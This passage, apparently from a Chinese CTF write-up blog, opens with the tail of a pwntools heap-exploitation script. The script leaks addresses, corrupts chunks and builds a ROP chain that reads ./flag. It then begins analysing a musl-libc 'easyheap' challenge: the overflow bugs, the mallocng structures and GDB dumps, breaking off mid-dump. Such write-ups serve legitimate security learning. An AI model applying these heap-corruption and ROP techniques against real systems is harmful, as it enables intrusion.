a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xFCB)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span> <span class="comment"># 17</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">target</span>):</span></span><br><span class="line">    a1 = BitVec(<span class="string">&quot;a1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    x = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        a1 ^= (<span class="number">32</span> * a1) ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>)) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    x.add(target == a1)</span><br><span class="line">    <span class="keyword">if</span>(x.check()==sat):</span><br><span class="line">        model = <span class="built_in">str</span>(x.model())</span><br><span class="line">        <span class="built_in">print</span>(model)</span><br><span class="line">        pos, val = model.split(<span class="string">&#x27;=&#x27;</span>)[:<span class="number">2</span>]</span><br><span class="line">        re = <span class="built_in">eval</span>(val[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(re))</span><br><span class="line">    <span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr1 = decode(leakaddr)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr2 = decode(leakaddr)</span><br><span class="line"></span><br><span class="line">leakaddr = leakaddr1 + leakaddr2 * <span class="number">0x100000000</span></span><br><span class="line">heap_base = leakaddr - <span class="number">0x670</span></span><br><span class="line">success(<span class="string">&quot;leakaddr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakaddr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#0</span></span><br><span class="line">heap_addr = heap_base + <span class="number">0xf60</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x541</span>) </span><br><span class="line">payload += p64(heap_addr+<span class="number">0x30</span>)+p64(heap_addr+<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x10</span>)+p64(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x108</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>+p64(<span class="number">0x540</span>)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)</span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i+<span class="number">7</span>)</span><br><span class="line">    </span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr1 = decode(leakaddr)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr2 = decode(leakaddr)</span><br><span class="line"></span><br><span class="line">leakaddr = leakaddr1 + leakaddr2 * <span class="number">0x100000000</span></span><br><span class="line">libc_base = leakaddr - <span class="number">0x3ec120</span></span><br><span class="line">success(<span class="string">&quot;leakaddr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakaddr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">61</span></span><br><span class="line">stack_libc = libc_base + <span class="number">0x5d1a40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    dele(<span class="number">4</span>-i)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0xb8</span>*<span class="string">&quot;a&quot;</span>+p64(<span class="number">0x111</span>)+p64(stack_libc)+p64(heap_base+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr1 = decode(leakaddr)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr2 = decode(leakaddr)</span><br><span class="line"></span><br><span class="line">leakaddr = leakaddr1 + leakaddr2 * <span class="number">0x100000000</span></span><br><span class="line">stack_base = leakaddr - <span class="number">0x1fc90</span></span><br><span class="line">success(<span class="string">&quot;leakaddr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakaddr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base+<span class="number">0x000000000001b500</span></span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_ret = libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">syscall_ret = libc_base+<span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">payload = <span class="string">&quot;b&quot;</span>*<span class="number">0x1d8</span>+p64(<span class="number">0x100</span>)+p64(stack_base+<span class="number">0x1fc48</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(bss_addr,0)[4]</span></span><br><span class="line">payload =  <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(stack_base+<span class="number">0x1fd20</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(4,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(stack_base+<span class="number">0x1fd20</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(stack_base+<span class="number">0x1fd20</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += <span class="string">&quot;./flag\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">easyheap: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so<span class="number">.1</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p>程序给了一个 libc.so，一番查找后发现这是一个 musl libc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn ./libc.<span class="function">so        </span></span><br><span class="line"><span class="function">musl <span class="title">libc</span> <span class="params">(x86_64)</span></span></span><br><span class="line"><span class="function">Version 1.2.2</span></span><br><span class="line"><span class="function">Dynamic Program Loader</span></span><br><span class="line"><span class="function">Usage: ./libc.so [options] [--] pathname [args]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：musl 只有一个 libc，即作为 libc 也是 ld</li>
</ul>
<p>对于 musl libc，patchelf 是无效的，需要将题目提供的 libc.so 复制到对应的目录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp libc.so /usr/lib/x86_64-linux-musl/libc.so</span><br></pre></td></tr></table></figure>
<p><strong>程序分析</strong></p>
<p>想要开启程序核心功能必须先逆向解密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  data = *codep;</span><br><span class="line">  keyp += <span class="number">2</span>;</span><br><span class="line">  ++codep;</span><br><span class="line">  <span class="built_in">sprintf</span>(keyp, <span class="string">&quot;%02x&quot;</span>, (<span class="keyword">unsigned</span> __int8)data ^ <span class="number">0x23</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( keyp != (<span class="keyword">char</span> *)&amp;zero );</span><br><span class="line"><span class="keyword">if</span> ( key[<span class="number">0</span>] ^ <span class="number">0x3036323130313437</span>LL | key[<span class="number">1</span>] ^ <span class="number">0x6337303165363331</span>LL</span><br><span class="line">  || key[<span class="number">2</span>] ^ <span class="number">0x3237633763343735</span>LL | key[<span class="number">3</span>] ^ <span class="number">0x3231313131363437</span>LL )</span><br></pre></td></tr></table></figure>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">key=[<span class="number">0x3036323130313437</span>,<span class="number">0x6337303165363331</span>,<span class="number">0x3237633763343735</span>,<span class="number">0x3231313131363437</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    num = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        key = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            key += <span class="built_in">chr</span>((num % <span class="number">0x100</span>))</span><br><span class="line">            num = num // <span class="number">0x100</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+key)^<span class="number">0x23</span>),end=<span class="string">&quot;&quot;</span>) <span class="comment"># W31C0M3_to_QWB21</span></span><br></pre></td></tr></table></figure>
<p>函数 Prepare 提供了4种核心功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">90</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">14</span>+funcs dq offset add                     ; DATA XREF: Prepare+<span class="number">230</span>↑o</span><br><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">70</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span>+                                        ; Prepare+<span class="number">23</span>C↑r</span><br><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq offset dele</span><br><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">00</span> <span class="number">00</span>                         dq offset show</span><br><span class="line">.data:<span class="number">0000000000204300</span>                               dq offset edit</span><br></pre></td></tr></table></figure>
<ul>
<li>add：输入 size 作为 num 的个数，然后输入 size 个 num，申请 <code>(num+1)*4</code> 大小的 chunk，以4字节为单位将数据写入 chunk，最后调用 <code>get_op</code> 依次遍历这些数字，并依次随机选择四则运算中的一个运算操作符进行运算，将运算结果填充到最后一个数字槽中</li>
<li>edit：重新输入 size 个 num，调用 <code>get_op</code> 进行计算，并将结果写回（位置错误）</li>
</ul>
<p>函数 Challenge 需要对最后一个随机生成的数字进行猜测，程序对每一次猜测提供了两次 Silver Finger 和全局两次 Golden Finger 的功能：</p>
<ul>
<li>Silver Finger 只会允许跳过当前级别对数字的猜测</li>
<li>Golden Finger 会根据用户输入的数字的数量，得到最终正确答案的数字</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>函数 add 执行结果回写的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = &amp;node-&gt;chunk[size + <span class="number">1</span> - <span class="number">1</span>];</span><br><span class="line">*data = get_op(chunk, size);</span><br></pre></td></tr></table></figure>
<p>函数 edit 执行结果回写的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sizea = size + <span class="number">1</span>;</span><br><span class="line">chunk[sizea] = get_op(chunk, sizea);</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现，函数 edit 有明显的4字节溢出</li>
</ul>
<p>打印数据时，会输出38字节，但是 <code>info.header-&gt;name</code> 的值可能小于38字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;#   Name: %-38s #\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;info.header-&gt;name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;#   Level: %-38d#\n&quot;</span>, **(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)((<span class="keyword">char</span> *)&amp;info.header-&gt;level + info.header-&gt;size));</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your name!&quot;</span>);</span><br><span class="line">readn(info.header-&gt;name, len);</span><br></pre></td></tr></table></figure>
<p>输入 num 时没有进行限制，导致可以将 heap 上的任意数据写入 mmapg</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num = input_num();</span><br><span class="line">......</span><br><span class="line">mmapg[index] = chunk[num];</span><br></pre></td></tr></table></figure>
<p><strong>libc musl</strong></p>
<p>musl 把 chunk 大小分为48类，用 size_to_class 进行计算（与 <code>*active[48]</code> 对应）</p>
<p>mallocng 在分配 meta 时，总是先分配一页的内存，然后划分为多个 meta 区域，而该页的最开始存放的就是 meta_area（这一页的内存用于管理 chunk）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> check; <span class="comment">/* 用于和malloc_context-&gt;secret进行匹配 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span> <span class="comment">/* 下一个节点指针 */</span></span><br><span class="line">	<span class="keyword">int</span> nslots; <span class="comment">/* 当前使用的meta数量 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span> <span class="comment">/* 指向meta的指针(结构体meta_area后面的内存就是meta数组) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span> <span class="comment">/* 双向链表 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span> <span class="comment">/* 指向group */</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask; <span class="comment">/* 可用/释放chunk的bitmap */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>; <span class="comment">/* 表示最后一个chunk的下标 */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>; <span class="comment">/* group的大小,如果mem是mmap分配,固定为63 */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>; <span class="comment">/* 如果group是mmap分配的,则代表内存页数,否则为&#x27;0&#x27; */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>多个相同大小的 chunk（物理相邻）以及一些控制信息会组成 group</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span> <span class="comment">/* 指回meta */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>]; <span class="comment">/* 0x10字节对齐(NUIT为0x10) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> storage[]; <span class="comment">/* 存放chunk数据 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>chunk 没有专门在代码中定义，但总体结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> prev_user_data[]; <span class="comment">/* 用于存储上一个chunk的数据 */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> idx; <span class="comment">/* 低5bit作为idx表示这是group中第几个chunk,高3bit作为预留位 */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset; <span class="comment">/* 与第一个chunk的偏移 */</span></span><br><span class="line">    <span class="keyword">char</span> user_data[]; <span class="comment">/* 用于存储数据 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>测试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add([<span class="number">1</span>]*<span class="number">6</span>)</span><br><span class="line">add([<span class="number">2</span>]*<span class="number">6</span>)</span><br><span class="line">add([<span class="number">3</span>]*<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<p>可以在 GDB 中打印此数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x555555604cc0</span> <span class="comment">/* 释放前 */</span></span><br><span class="line"><span class="number">0x555555604cc0</span>:	<span class="number">0x556060e0</span>	<span class="number">0x00005555</span>	<span class="number">0x0000000e</span>	<span class="number">0x00000000</span> <span class="comment">/* chunk1 */</span></span><br><span class="line"><span class="number">0x555555604cd0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x555555604ce0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0xffffffff</span>	<span class="number">0x00020100</span> <span class="comment">/* chunk2 */</span></span><br><span class="line"><span class="number">0x555555604cf0</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x555555604d00</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0xfffffffa</span>	<span class="number">0x00040200</span> <span class="comment">/* chunk3 */</span></span><br><span class="line"><span class="number">0x555555604d10</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span></span><br><span class="line"><span class="number">0x555555604d20</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x0000000f</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x555555604cc0</span> <span class="comment">/* 释放后 */</span></span><br><span class="line"><span class="number">0x555555604cc0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x0000000e</span>	<span class="number">0x0000ff00</span> <span class="comment">/* chunk1 */</span></span><br><span class="line"><span class="number">0x555555604cd0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x555555604ce0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000002</span>	<span class="number">0x0000ff00</span> <span class="comment">/* chunk2 */</span></span><br><span class="line"><span class="number">0x555555604cf0</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x555555604d00</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000010</span>	<span class="number">0x0000ff00</span> <span class="comment">/* chunk3 */</span></span><br><span class="line"><span class="number">0x555555604d10</span>:	<span class="number">0x00000003</span>	<span 